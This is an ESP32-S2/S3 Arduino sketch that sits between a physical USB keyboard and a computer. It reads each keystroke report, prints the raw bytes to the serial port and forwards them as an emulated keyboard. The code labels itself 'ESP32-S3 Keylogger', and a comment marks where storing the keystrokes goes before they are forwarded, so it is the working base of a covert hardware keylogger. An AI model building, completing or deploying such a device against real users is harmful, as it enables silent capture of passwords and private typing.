#if !defined CONFIG_IDF_TARGET_ESP32S3 && !defined CONFIG_IDF_TARGET_ESP32S2
  #error "This sketch will only run on ESP32-S2 or S3"
#endif

#if ARDUINO_USB_MODE
  #error "This sketch should be used when USB is in OTG mode"
#endif

// USB Host Part (handles detection and input from the physical keyboard)
#define DP_P0  15  // USB Host Data+ Pin (must be an analog pin)
#define DM_P0  16  // USB Host Data- Pin (must be an analog pin)
#define FORCE_TEMPLATED_NOPS
#include <ESP32-USB-Soft-Host.h>

// Device Part (handles HID device emulation)
#include "USB.h"
#include "USBHIDKeyboard.h" // Keybo
USBHIDKeyboard Keyboard;

static void onKeyboarDetect( uint8_t usbNum, void * dev )
{
  sDevDesc *device = (sDevDesc*)dev;
  printf("New device detected on USB#%d\n", usbNum);
  printf("desc.bcdUSB             = 0x%04x\n", device->bcdUSB);
  printf("desc.bDeviceClass       = 0x%02x\n", device->bDeviceClass);
  printf("desc.bDeviceSubClass    = 0x%02x\n", device->bDeviceSubClass);
  printf("desc.bDeviceProtocol    = 0x%02x\n", device->bDeviceProtocol);
  printf("desc.bMaxPacketSize0    = 0x%02x\n", device->bMaxPacketSize0);
  printf("desc.idVendor           = 0x%04x\n", device->idVendor);
  printf("desc.idProduct          = 0x%04x\n", device->idProduct);
  printf("desc.bcdDevice          = 0x%04x\n", device->bcdDevice);
  printf("desc.iManufacturer      = 0x%02x\n", device->iManufacturer);
  printf("desc.iProduct           = 0x%02x\n", device->iProduct);
  printf("desc.iSerialNumber      = 0x%02x\n", device->iSerialNumber);
  printf("desc.bNumConfigurations = 0x%02x\n", device->bNumConfigurations);
  // if( device->iProduct == mySupportedIdProduct && device->iManufacturer == mySupportedManufacturer ) {
  //   myListenUSBPort = usbNum;
  // }

  static bool usb_dev_begun = false;

  if( !usb_dev_begun ) {
    printf("Starting USB");
    Keyboard.begin();
    USB.begin();
  }
}


static void onKeyboardData(uint8_t usbNum, uint8_t byte_depth, uint8_t* data, uint8_t data_len)
{
  // if( myListenUSBPort != usbNum ) return;
  printf("in: ");
  for(int k=0;k<data_len;k++) {
    printf("0x%02x ", data[k] );
  }
  printf("\n");

  // implement keylogger here, before forwarding

  Keyboard.sendReport( (KeyReport*)data );
}

usb_pins_config_t USB_Pins_Config =
{
  DP_P0, DM_P0,
  -1, -1,
  -1, -1,
  -1, -1
};


void setup()
{
  Serial.begin(115200);
  delay(5000);
  printf("ESP32-S3 Keylogger\n" );
  printf("TIMER_BASE_CLK: %d, TIMER_DIVIDER:%d, TIMER_SCALE: %d\n", TIMER_BASE_CLK, TIMER_DIVIDER, TIMER_SCALE );
  // USH.setTaskCore( 0 );
  // USH.setBlinkPin( (gpio_num_t) 2 );
  // USH.setTaskPriority( 16 );
  USH.setOnConfigDescCB( Default_USB_ConfigDescCB );
  USH.setOnIfaceDescCb( Default_USB_IfaceDescCb );
  USH.setOnHIDDevDescCb( Default_USB_HIDDevDescCb );
  USH.setOnEPDescCb( Default_USB_EPDescCb );

  USH.init( USB_Pins_Config, onKeyboarDetect, onKeyboardData );
}

void loop()
{
  vTaskDelete(NULL);
}


